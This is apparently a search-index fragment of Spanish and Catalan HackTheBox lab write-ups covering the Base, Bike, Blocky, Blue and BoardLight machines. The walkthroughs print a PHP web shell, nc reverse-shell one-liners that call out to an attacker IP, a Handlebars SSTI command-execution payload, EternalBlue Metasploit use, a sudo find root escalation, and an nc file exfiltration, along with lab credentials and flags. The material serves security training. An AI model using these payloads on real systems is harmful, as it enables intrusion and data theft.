que se trataba"},{"location":"Writeup-ctfs/HackTheBox/Base/","title":"Base","text":"<p>\ud83e\udde0 Plataforma: HackTheBox</p> <p>\ud83d\udcbb Sistema operativo: Linux</p> <p>\ud83c\udfaf Nivel: Very Easy</p> <p>\u2705 Estado: Done</p> <p>\ud83d\udcd8 Curso eJPT: yes</p> <p>\ud83d\uddd3\ufe0f Fecha de creaci\u00f3n: 15 de enero de 2025 21:11</p> <p>\ud83c\udf10 IP: <code>10.129.127.10</code></p>"},{"location":"Writeup-ctfs/HackTheBox/Base/#recopilacion-de-informacion","title":"Recopilaci\u00f3n de informaci\u00f3n","text":"<p>\ud83d\udca1</p>"},{"location":"Writeup-ctfs/HackTheBox/Base/#escaneo-de-puertos","title":"Escaneo de puertos","text":"<p>Comenzamos con un escaneo para identificar que puertos est\u00e1n abiertos.</p> <pre><code>\u276f sudo nmap -p- --open --min-rate 5000 -sS -n -Pn -vvv 10.129.127.10 -oG allports\n\nPORT   STATE SERVICE REASON\n22/tcp open  ssh     syn-ack ttl 63\n80/tcp open  http    syn-ack ttl 63\n</code></pre>"},{"location":"Writeup-ctfs/HackTheBox/Base/#enumeracion-de-servicios","title":"Enumeraci\u00f3n de servicios","text":"<p>Una vez listado los puertos accesibles, procederemos a realizar la enumeraci\u00f3n de servicios para su posterior identificaci\u00f3n de vulnerabilidades.</p> <pre><code>\u276f sudo nmap -p22,80 -sCV 10.129.127.10 -oN targeted\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 f6:5c:9b:38:ec:a7:5c:79:1c:1f:18:1c:52:46:f7:0b (RSA)\n|   256 65:0c:f7:db:42:03:46:07:f2:12:89:fe:11:20:2c:53 (ECDSA)\n|_  256 b8:65:cd:3f:34:d8:02:6a:e3:18:23:3e:77:dd:87:40 (ED25519)\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-title: Welcome to Base\n|_http-server-header: Apache/2.4.29 (Ubuntu)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre> <ul> <li>Identificaci\u00f3n de vulnerabilidades</li> <li>22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)</li> <li>80/tcp open http Apache httpd 2.4.29 ((Ubuntu))</li> <li> <p>Enumeraci\u00f3n Web</p> <p>whatweb</p> <pre><code>http://10.129.127.10 [200 OK] Apache[2.4.29], Bootstrap, Country[RESERVED][ZZ], Email[info@base.htb], Frame, HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.129.127.10], Lightbox, Script, Title[Welcome to Base]\n</code></pre> <p>Vemos que la web tiene una pagina de login</p> <p></p> <p>Siguiendo las indicaciones vemos que nos habla de strcmp </p> <p>Buscamos como hacer el bypass al formulario de login</p> <p>https://www.doyler.net/security-not-included/bypassing-php-strcmp-abctf2016.</p> <p>Se acontece pasando valores en blanco de los parametros username y password</p> <p></p> <p>Una vez hecho vemos el formulario de subida de ficheros</p> </li> </ul>"},{"location":"Writeup-ctfs/HackTheBox/Base/#explotacion","title":"Explotaci\u00f3n","text":"<p>\ud83d\udca1</p>"},{"location":"Writeup-ctfs/HackTheBox/Base/#explotacion-1","title":"Explotaci\u00f3n 1","text":"<p>Probamos a subir una revershell : cmdshell</p> <pre><code>&lt;?php echo \"&lt;pre&gt;\" . system($_GET['cmd']) . \"&lt;/pre&gt;\"; ?&gt;\n</code></pre> <p>Accedemos al directorio de descargas /.uploaded y prbamos un woami</p> <p></p> <p>Tenemos RCE, probamos a obtener una Shell</p> <pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2&gt;&amp;1|nc 10.10.16.103 4444 &gt;/tmp/f\n\nURlEncodeamos\n\nrm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Cbash%20-i%202%3E%261%7Cnc%2010.10.16.103%204444%20%3E%2Ftmp%2Ff\n</code></pre> <p></p> <p>Hacemos el tratamiento de la tty</p> <pre><code>script -c bash /dev/null\ncntr+z\nstty raw -echo; fg\nreset x term\nexport TERM=XTERM\nexport SHELL=BASH\n</code></pre> <p>Encontramos usuario Jhon enumerando el /etc/passwd</p> <p>En la carpeta de /var/www/html/login/config.php vemos credenciales :</p> <pre><code>&lt;?php\n$username = \"admin\";\n$password = \"thisisagoodpassword\"\n</code></pre> <p>Probamos a migrar a usuario Jhon</p> <p></p> <p>En el home, encontramos el flag user.txt</p> <pre><code>f54846c258f3b4612f78a819573d158e\n</code></pre>"},{"location":"Writeup-ctfs/HackTheBox/Base/#_1","title":"Base","text":""},{"location":"Writeup-ctfs/HackTheBox/Base/#escalada-de-privilegios","title":"Escalada de privilegios","text":"<p>Buscamos bianrios con</p> <pre><code>sudo -l\nMatching Defaults entries for john on base:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser john may run the following commands on base:\n    (root : root) /usr/bin/find\n</code></pre> <p>Buscamos en GTFObins el exploit</p> <pre><code>./find . -exec /bin/sh -p \\; -quit\n</code></pre> <p>Probamos :</p> <pre><code>john@base:/usr/bin$ sudo find . -exec /bin/sh \\; -quit\n# whoami\nroot\n# \n</code></pre> <p>Obtenemos la flag de root:</p> <pre><code># cat root.txt  \n51709519ea18ab37dd6fc58096bea949\n</code></pre>"},{"location":"Writeup-ctfs/HackTheBox/Base/#conclusion","title":"Conclusi\u00f3n","text":"<p>\ud83d\udca1 Maquina facil, pero que he tenido que mirar writte up porque no sabia como progresar en el tema del *strcmp.* ^ Pensaba que la enumeraci\u00f3n iba por SSH y he perdido mucho tiempo probando explotis que no funcionaban</p>"},{"location":"Writeup-ctfs/HackTheBox/Bike/","title":"Bike","text":"<p>Plataforma: HackTheBox OS: Linux Level: Very Easy Status: Done Complete: Yes Created time: 6 de enero de 2025 14:02 IP: 10.129.97.64</p>"},{"location":"Writeup-ctfs/HackTheBox/Bike/#recopilacion-de-informacion","title":"Recopilaci\u00f3n de informaci\u00f3n","text":"\ud83d\udca1"},{"location":"Writeup-ctfs/HackTheBox/Bike/#escaneo-de-puertos","title":"Escaneo de puertos","text":"<p>Comenzamos con un escaneo para identificar que puertos est\u00e1n abiertos.</p> <pre><code>\u276f sudo nmap -p- --open --min-rate 5000 -sS -n -Pn -vvv 10.129.97.64 -oG allports\nPORT   STATE SERVICE REASON\n22/tcp open  ssh     syn-ack ttl 63\n80/tcp open  http    syn-ack ttl 63\n</code></pre>"},{"location":"Writeup-ctfs/HackTheBox/Bike/#enumeracion-de-servicios","title":"Enumeraci\u00f3n de servicios","text":"<p>Una vez listado los puertos accesibles, procederemos a realizar la enumeraci\u00f3n de servicios para su posterior identificaci\u00f3n de vulnerabilidades.</p> <pre><code>\u276f sudo nmap -p22,80 -sCV -vvv 10.129.97.64 -oN targeted\n\nPORT   STATE SERVICE REASON         VERSION\n22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)\n| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC82vTuN1hMqiqUfN+Lwih4g8rSJjaMjDQdhfdT8vEQ67urtQIyPszlNtkCDn6MNcBfibD/7Zz4r8lr1iNe/Afk6LJqTt3OWewzS2a1TpCrEbvoileYAl/Feya5PfbZ8mv77+MWEA+kT0pAw1xW9bpkhYCGkJQm9OYdcsEEg1i+kQ/ng3+GaFrGJjxqYaW1LXyXN1f7j9xG2f27rKEZoRO/9HOH9Y+5ru184QQXjW/ir+lEJ7xTwQA5U1GOW1m/AgpHIfI5j9aDfT/r4QMe+au+2yPotnOGBBJBz3ef+fQzj/Cq7OGRR96ZBfJ3i00B/Waw/RI19qd7+ybNXF/gBzptEYXujySQZSu92Dwi23itxJBolE6hpQ2uYVA8VBlF0KXESt3ZJVWSAsU3oguNCXtY7krjqPe6BZRy+lrbeska1bIGPZrqLEgptpKhz14UaOcH9/vpMYFdSKr24aMXvZBDK1GJg50yihZx8I9I367z0my8E89+TnjGFY2QTzxmbmU=\n|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)\n| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH2y17GUe6keBxOcBGNkWsliFwTRwUtQB3NXEhTAFLziGDfCgBV7B9Hp6GQMPGQXqMk7nnveA8vUz0D7ug5n04A=\n|   256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)\n|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKfXa+OM5/utlol5mJajysEsV4zb/L0BJ1lKxMPadPvR\n80/tcp open  http    syn-ack ttl 63 Node.js (Express middleware)\n|_http-title:  Bike \n| http-methods: \n|_  Supported Methods: GET HEAD POST OPTIONS\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre> <ul> <li> <p>Identificaci\u00f3n de vulnerabilidades</p> </li> </ul> <p>Enumeraci\u00f3n Web</p> <p>whatweb</p> <pre><code>whatweb 10.129.97.64\n\nhttp://10.129.97.64 [200 OK] Country[RESERVED][ZZ], HTML5, IP[10.129.97.64], JQuery[2.2.4], Script, Title[Bike], X-Powered-By[Express], X-UA-Compatible[ie=edge]\n</code></pre>"},{"location":"Writeup-ctfs/HackTheBox/Bike/#-22tcp-open-ssh-syn-ack-ttl-63-openssh-82p1-ubuntu-4ubuntu04-ubuntu-linux-protocol-20","title":"- 22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)","text":"<p>80/tcp open  http    syn-ack ttl 63 Node.js (Express middleware)</p>"},{"location":"Writeup-ctfs/HackTheBox/Bike/#explotacion","title":"Explotaci\u00f3n","text":"\ud83d\udca1 El seguimiento de HackThBox nos indica que hay un posible fallo relacionado con un Server Side Template Injection"},{"location":"Writeup-ctfs/HackTheBox/Bike/#explotacion-1","title":"Explotaci\u00f3n 1","text":"<p>Test SSTI: Probamos con un test</p> <p></p> <pre><code>Payload: Campo email\n {{7*7}} \n</code></pre> <p></p> <p>Vemos que da un error</p> <p>Revisando Hacktricks encontramos un Payload para Handlebars en Node.js </p> <pre><code>{{#with \"s\" as |string|}}\n {{#with \"e\"}}\n {{#with split as |conslist|}}\n {{this.pop}}\n {{this.push (lookup string.sub \"constructor\")}}\n {{this.pop}}\n {{#with string.split as |codelist|}}\n {{this.pop}}\n {{this.push \"return require('child_process').exec('whoami');\"}}\n {{this.pop}}\n {{#each conslist}}\n {{#with (string.sub.apply 0 codelist)}}\n {{this}}\n {{/with}}\n {{/each}}\n {{/with}}\n {{/with}}\n {{/with}}\n{{/with}}\n</code></pre> <p>URLencodeamos con BurpSuite para poder pasarlo con el request</p> <p>Obtenemos un error :</p> <p>The response shows an error that states require is not defined . Taking a look at the payload we notice the following code</p> <pre><code>{{this.push \"return require('child_process').exec('whoami');\"}}\n</code></pre> <p>Hay que modificar las variables ya que node.js usa variables globales :</p> <pre><code>__dirname\n__filename\nexports\nmodule\nrequire()\n</code></pre> <p>Usamos por lo tanto:</p> <pre><code>{{#with \"s\" as |string|}}\n {{#with \"e\"}}\n {{#with split as |conslist|}}\n {{this.pop}}\n {{this.push (lookup string.sub \"constructor\")}}\n {{this.pop}}\n {{#with string.split as |codelist|}}\n {{this.pop}}\n {{this.push \"return\nprocess.mainModule.require('child_process').execSync('whoami');\"}}\n {{this.pop}}\n {{#each conslist}}\n {{#with (string.sub.apply 0 codelist)}}\n {{this}}\n {{/with}}\n {{/each}}\n {{/with}}\n {{/with}}\n {{/with}}\n{{/with}}\n</code></pre> <p>Con la linia modificada :</p> <pre><code>{{this.push \"return process.mainModule.require('child_process').execSync('whoami');\"}}\n</code></pre> <p>Ahora, con Burpsuite, URLEncodeamos el payload y lo enviamos en el campo \u201cemail\u201d:</p> <p></p> <p></p> <p>Vemos que se ejecuta el comando \u201cwhoami\u201d que enviamos en el payload.</p> <p>Ahora probamos con otros comandos:</p> <pre><code># Listar contenido de root\n\n{{this.push \"return process.mainModule.require('child_process').execSync('ls\n/root');\"}}\n</code></pre> <p></p> <p>Por \u00faltimo, probamos a leer el contenido de la flag con:</p> <pre><code>{{this.push \"return process.mainModule.require('child_process').execSync('cat\n/root/flag.txt');\"}}\n</code></pre> <p></p> <p>Flag:  6b258d726d287462d60c103d0142a81c</p>"},{"location":"Writeup-ctfs/HackTheBox/Bike/#conclusion","title":"Conclusi\u00f3n","text":"\ud83d\udca1 Maquina establecida como muy f\u00e1cil, pero que al no conocer Node.js ni como proceder a explotar un SSTI, me ha supuesto tener que mirar el Writeup"},{"location":"Writeup-ctfs/HackTheBox/Blocky/","title":"Blocky","text":"<p>\ud83e\udde0 Plataforma: HackTheBox</p> <p>\ud83d\udcbb Sistema operativo: Linux</p> <p>\ud83c\udfaf Nivel: Easy</p> <p>\u2705 Estado: Done</p> <p>\ud83d\udcd8 Curso eJPT: yes</p> <p>\ud83d\uddd3\ufe0f Fecha de creaci\u00f3n: 25 de enero de 2025 16:39</p> <p>\ud83c\udf10 IP: <code>10.10.10.37</code></p>"},{"location":"Writeup-ctfs/HackTheBox/Blocky/#recopilacion-de-informacion","title":"Recopilaci\u00f3n de informaci\u00f3n","text":"\ud83d\udca1 Reconocimiento general"},{"location":"Writeup-ctfs/HackTheBox/Blocky/#escaneo-de-puertos","title":"Escaneo de puertos","text":"<p>Comenzamos con un escaneo para identificar que puertos est\u00e1n abiertos.</p> <pre><code>sudo nmap -p- --open -T5 -sS --min-rate 5000 -n -Pn -vvv 10.10.10.37 -oG targeted\n\nPORT      STATE SERVICE   REASON\n21/tcp    open  ftp       syn-ack ttl 63\n22/tcp    open  ssh       syn-ack ttl 63\n80/tcp    open  http      syn-ack ttl 63\n25565/tcp open  minecraft syn-ack ttl 63\n</code></pre>"},{"location":"Writeup-ctfs/HackTheBox/Blocky/#enumeracion-de-servicios","title":"Enumeraci\u00f3n de servicios","text":"<p>Una vez listado los puertos accesibles, procederemos a realizar la enumeraci\u00f3n de servicios para su posterior identificaci\u00f3n de vulnerabilidades.</p> <pre><code>\u276f sudo nmap -p21,22,80,25565 -sCV 10.10.10.37 -oN targeted\n\nPORT      STATE SERVICE   VERSION\n21/tcp    open  ftp       ProFTPD 1.3.5a\n22/tcp    open  ssh       OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)\n|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)\n|_  256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)\n80/tcp    open  http      Apache httpd 2.4.18\n|_http-title: Did not follow redirect to http://blocky.htb\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n25565/tcp open  minecraft Minecraft 1.11.2 (Protocol: 127, Message: A Minecraft Server, Users: 0/20)\nService Info: Host: 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre> <ul> <li> <p>Identificaci\u00f3n de vulnerabilidades</p> <ul> <li>21/tcp    open  ftp       ProFTPD 1.3.5a</li> <li>22/tcp    open  ssh       OpenSSH 7.2p2 Ubuntu 4ubuntu2.2</li> <li>80/tcp    open  http      Apache httpd 2.4.18</li> <li>25565/tcp open  minecraft Minecraft 1.11.2</li> </ul> </li> <li> <p>Enumeraci\u00f3n WEB</p> <p>Hacemos fuzzing para ver sitios</p> <pre><code>\u276f gobuster dir -u http://blocky.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n\nStarting gobuster in directory enumeration mode\n===============================================================\n/wiki                 (Status: 301) [Size: 307] [--&gt; http://blocky.htb/wiki/]\n/wp-content           (Status: 301) [Size: 313] [--&gt; http://blocky.htb/wp-content/]\n/plugins              (Status: 301) [Size: 310] [--&gt; http://blocky.htb/plugins/]\n/wp-includes          (Status: 301) [Size: 314] [--&gt; http://blocky.htb/wp-includes/]\n/javascript           (Status: 301) [Size: 313] [--&gt; http://blocky.htb/javascript/]\n/wp-admin             (Status: 301) [Size: 311] [--&gt; http://blocky.htb/wp-admin/]\n/phpmyadmin \n</code></pre> </li> </ul> <p>Vemos que en el directorio /plugins hay dos ficheros. Los descargamos :</p> <pre><code>\u276f wget http://blocky.htb/plugins/files/BlockyCore.jar\n\u276f wget http://blocky.htb/plugins/files/griefprevention-1.11.2-3.1.1.298.jar\n</code></pre> <p>Abrimos los ficheros. Dentro de BlockyCore hay dos ficheros mas. Abrimos BlockyCore.class y vemos con strings si hay datos</p> <pre><code> strings BlockyCore.class\ncom/myfirstplugin/BlockyCore\njava/lang/Object\nsqlHost\nLjava/lang/String;\nsqlUser\nsqlPass\n&lt;init&gt;\nCode\n    localhost   \nroot    \n8YsqfCTnvxAUeduzjNSXe22 \nLineNumberTable\nLocalVariableTable\nthis\nLcom/myfirstplugin/BlockyCore;\nonServerStart\nonServerStop\nonPlayerJoin\nTODO get username\n!Welcome to the BlockyCraft!!!!!!!\nsendMessage\n'(Ljava/lang/String;Ljava/lang/String;)V\nusername\nmessage\nSourceFile\nBlockyCore.java\n</code></pre> <p>Encontramos un password para root: 8YsqfCTnvxAUeduzjNSXe22  </p> <p>Probamos a acceder por ssh</p>"},{"location":"Writeup-ctfs/HackTheBox/Blocky/#explotacion","title":"Explotaci\u00f3n","text":"\ud83d\udca1 Probamos diferentes accesos"},{"location":"Writeup-ctfs/HackTheBox/Blocky/#explotacion-1","title":"Explotaci\u00f3n 1","text":"<p>Probamos a acceder con credenciales anteriores de root. Vemos que no funciona</p> <p>Probamos a accder con credenciales para usuario anterior visto en la web: notch</p> <pre><code>\u276f ssh notch@10.10.10.37\nnotch@Blocky:~$ \n</code></pre> <p>Encontramos flag de user.txt</p> <pre><code>notch@Blocky:~$ ls  \nminecraft  user.txt\nnotch@Blocky:~$ cat user.txt \nd649a752520fd4d3d4477eb021cef751\nnotch@Blocky:~$ \n</code></pre>"},{"location":"Writeup-ctfs/HackTheBox/Blocky/#explotacion-posterior","title":"Explotaci\u00f3n posterior","text":"\ud83d\udca1 Accedemos con las credenciales encontradas"},{"location":"Writeup-ctfs/HackTheBox/Blocky/#escalada-de-privilegios","title":"Escalada de privilegios","text":"<p>Vamos a probar a escalar privilegios desde notch hasta root.</p> <pre><code>notch@Blocky:~$ sudo -l\nMatching Defaults entries for notch on Blocky:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser notch may run the following commands on Blocky:\n    (ALL : ALL) ALL\nnotch@Blocky:~$ sudo su\nroot@Blocky:/home/notch# \n</code></pre> <p>Hemos visto que como usuario notch podemos ejecutar cualquier comando, por lo que nos convertimos en root y obtenemos la flag</p> <pre><code>root@Blocky:~# cat root.txt \n3c7c13456cbfef5026ce92b9f4cf6524\n</code></pre>"},{"location":"Writeup-ctfs/HackTheBox/Blocky/#conclusion","title":"Conclusi\u00f3n","text":"\ud83d\udca1 Maquina f\u00e1cil con una escalada pr\u00e1cticamente nula"},{"location":"Writeup-ctfs/HackTheBox/Blue/","title":"Blue","text":"<p>\ud83e\udde0 Plataforma: HackTheBox</p> <p>\ud83d\udcbb Sistema operativo: Windows</p> <p>\ud83c\udfaf Nivel: Easy</p> <p>\u2705 Estado: Done</p> <p>\ud83d\udcd8 Curso eJPT: yes</p> <p>\ud83d\uddd3\ufe0f Fecha de creaci\u00f3n: 26 de enero de 2025 16:36</p> <p>\ud83c\udf10 IP: <code>10.10.10.40</code></p>"},{"location":"Writeup-ctfs/HackTheBox/Blue/#recopilacion-de-informacion","title":"Recopilaci\u00f3n de informaci\u00f3n","text":"\ud83d\udca1 Reconocimiento general   <p>Que sistema </p> <pre><code>whichSystem.py 10.10.10.40\n\n    10.10.10.40 (ttl -&gt; 127): Windows\n</code></pre>"},{"location":"Writeup-ctfs/HackTheBox/Blue/#escaneo-de-puertos","title":"Escaneo de puertos","text":"<p>Comenzamos con un escaneo para identificar que puertos est\u00e1n abiertos.</p> <pre><code>sudo nmap -p- --open -T5 -sS --min-rate 5000 -n -Pn -vvv 10.10.10.40 -oG targeted\n\nPORT      STATE SERVICE      REASON\n135/tcp   open  msrpc        syn-ack ttl 127\n139/tcp   open  netbios-ssn  syn-ack ttl 127\n445/tcp   open  microsoft-ds syn-ack ttl 127\n49152/tcp open  unknown      syn-ack ttl 127\n49154/tcp open  unknown      syn-ack ttl 127\n49156/tcp open  unknown      syn-ack ttl 127\n49157/tcp open  unknown      syn-ack ttl 127\n</code></pre>"},{"location":"Writeup-ctfs/HackTheBox/Blue/#enumeracion-de-servicios","title":"Enumeraci\u00f3n de servicios","text":"<p>Una vez listado los puertos accesibles, procederemos a realizar la enumeraci\u00f3n de servicios para su posterior identificaci\u00f3n de vulnerabilidades.</p> <pre><code>\u276f sudo nmap -p135,139,445 -sCV 10.10.10.40 -oN targeted\n\nPORT    STATE SERVICE      VERSION\n135/tcp open  msrpc        Microsoft Windows RPC\n139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn\n445/tcp open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)\nService Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb-security-mode: \n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n| smb2-security-mode: \n|   2:1:0: \n|_    Message signing enabled but not required\n|_clock-skew: mean: 2s, deviation: 2s, median: 1s\n| smb-os-discovery: \n|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)\n|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional\n|   Computer name: haris-PC\n|   NetBIOS computer name: HARIS-PC\\x00\n|   Workgroup: WORKGROUP\\x00\n|_  System time: 2025-01-26T15:40:38+00:00\n| smb2-time: \n|   date: 2025-01-26T15:40:39\n|_  start_date: 2025-01-26T15:36:56\n</code></pre> <ul> <li> <p>Identificaci\u00f3n de vulnerabilidades</p> <ul> <li>135/tcp open  msrpc        Microsoft Windows RPC</li> <li>139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn</li> <li>445/tcp open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)</li> </ul> </li> <li> <p>Enumeramos el HOST (139-445)</p> <p>Enumeramos los recursos compartidos de la maquina</p> <pre><code>smbclient -L 10.10.10.40 -N \n\n    Sharename       Type      Comment\n    ---------       ----      -------\n    ADMIN$          Disk      Remote Admin\n    C$              Disk      Default share\n    IPC$            IPC       Remote IPC\n    Share           Disk      \n    Users           Disk      \n</code></pre> <p>Vemos que es un Windows 7 y probamos con metasploit si es vulnerable a EternalBlue</p> <p>Vemos que si.</p> <pre><code>msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; show options\nmsf6 auxiliary(scanner/smb/smb_ms17_010) &gt; set RHOST 10.10.10.40\nRHOST =&gt; 10.10.10.40\nmsf6 auxiliary(scanner/smb/smb_ms17_010) &gt; run\n\n[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)\n[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nmsf6 auxiliary(scanner/smb/smb_ms17_010) &gt; \n</code></pre> <p>Procedemos a ejecutar el exploit en la Explotacion 1</p> </li> </ul>"},{"location":"Writeup-ctfs/HackTheBox/Blue/#explotacion","title":"Explotaci\u00f3n","text":"\ud83d\udca1 Probamos diferentes accesos"},{"location":"Writeup-ctfs/HackTheBox/Blue/#explotacion-1","title":"Explotaci\u00f3n 1","text":"<p>Probamos a ejecutar EternalBlue</p> <pre><code>msf6 &gt; search eternal blue\n\nMatching Modules\n================\n0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption\n\nmsf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show options\n\nModule options (exploit/windows/smb/ms17_010_eternalblue):\n\n   Name           Current Setting  Required  Description\n   ----           ---------------  --------  -----------\n   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html\n   RPORT          445              yes       The target port (TCP)\n   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target\n                                              machines.\n   SMBPass                         no        (Optional) The password for the specified username\n   SMBUser                         no        (Optional) The username to authenticate as\n   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target mac\n                                             hines.\n   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.\n\nPayload options (windows/x64/meterpreter/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)\n   LHOST     192.168.70.128   yes       The listen address (an interface may be specified)\n   LPORT     4444             yes       The listen port\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Automatic Target\n\n\nmsf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set RHOST 10.10.10.40\nRHOST =&gt; 10.10.10.40\nmsf6 exploit(windows/smb/ms17_010_eternalblue) &gt; run\n</code></pre>"},{"location":"Writeup-ctfs/HackTheBox/Blue/#_1","title":"Blue","text":""},{"location":"Writeup-ctfs/HackTheBox/Blue/#explotacion-posterior","title":"Explotaci\u00f3n posterior","text":"\ud83d\udca1 Accedemos con metasploit a una consola meterpreter con usuario NT AUTHORITY\\SYSTEM   <p>Obtenemos las flags del usuario haris y Administrator:</p> <pre><code>C:\\Users\\haris\\Desktop&gt;type user.txt\ntype user.txt\nd552c4ae981f914576c21f1c689830b9\n\nC:\\Users\\Administrator\\Desktop&gt;type root.txt\ntype root.txt\n9ff673e656d4416b02b43e4c1ab509c4\n</code></pre>"},{"location":"Writeup-ctfs/HackTheBox/Blue/#conclusion","title":"Conclusi\u00f3n","text":"\ud83d\udca1 Maquina f\u00e1cil sin escalada de privilegios"},{"location":"Writeup-ctfs/HackTheBox/BoardLight/","title":"BoardLight","text":"<p>Plataforma: HackTheBox OS: Linux Level: Easy Status: Done Complete: Yes Created time: 2 de diciembre de 2024 14:00 IP: 10.10.11.11</p>"},{"location":"Writeup-ctfs/HackTheBox/BoardLight/#reconocimiento","title":"Reconocimiento","text":"<p>NMAP (allports)</p> <pre><code>sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.11 -oN extractports``\n</code></pre> <p>Resultats:</p> <p> </p> <p>NMAP Ports:</p> <pre><code>sudo nmap -p22,80 -sCV 10.10.11.11 -oN nmap\n</code></pre> <p>Resultats:</p> <p> </p> <p>An\u00e1lisis de vulnerabilidades</p> <p>POC RCE https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253</p>"},{"location":"Writeup-ctfs/HackTheBox/BoardLight/#explotacion-de-vulnerabilidades","title":"Explotaci\u00f3n de vulnerabilidades","text":"<p>Executem exploit per a Dolibar 17.0.0</p> <pre><code>python3 exploit.py &lt;http://crm.board.htb&gt; admin admin 10.10.14.185 4444\nnc -lvnp 4444\n</code></pre> <p></p> <p>Tractament TTY:</p> <pre><code>script /dev/null -c bash\nCTRL + Z\nstty raw -echo; fg\nreset xterm\nexport TERM=xterm\nexport SHELL=bash\n</code></pre>"},{"location":"Writeup-ctfs/HackTheBox/BoardLight/#escalada-de-privilegios","title":"Escalada de privilegios","text":"<p>Trobem al directori /tmp/pr4gm$:</p> <p></p> <p>descarreguem el arxiu</p> <p>Comando m\u00e1quina atacante:</p> <pre><code> nc -lvp 4444 &gt; linpeas.txt\n</code></pre> <p>Comando m\u00e1quina v\u00edctima:</p> <pre><code>nc 192.168.106.128 4444 -w 3 &lt; linpeas.txt\n</code></pre> <p>Busquem dins del fitxer si trobem dades</p> <pre><code>cat results | grep board\n</code></pre> <p>Trobem la configuracio de la base de dades:</p> <p></p> <p>Trobem diferents usuaris per la BD: config.php</p> <p></p> <p>Pass: serverfun2$2023!!</p> <p>Provem aquest password amb usuari larissa</p> <p>Escalem privilegis a larissa</p> <p>Canviem la revershell per ssh i entrem com a larissa trobem flag: user.txt</p> <p>user.txt: 8551aca9cdeb37137c17fd1fa350ea1a</p> <p>Busquem per suid:</p> <pre><code>find / -perm -u=s -type f 2&gt;/dev/null\n</code></pre> <p></p> <p>Trobem que podem explotar el enlightenment_sys Busquem exploit:</p> <p>https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/blob/main/exploit.sh</p> <p>El copiem amb</p> <pre><code>'Maquina nostre'\n\npython3 -m http.server 80 `a la carpeta on tenim el fitxer`\n\n'Maquina victima'\n\nwget nostreip/nom_fitxer\n</code></pre> <p>Donem permisos:</p> <p>chmod a+x exploit.sh</p> <p>executem exploit.sh</p> 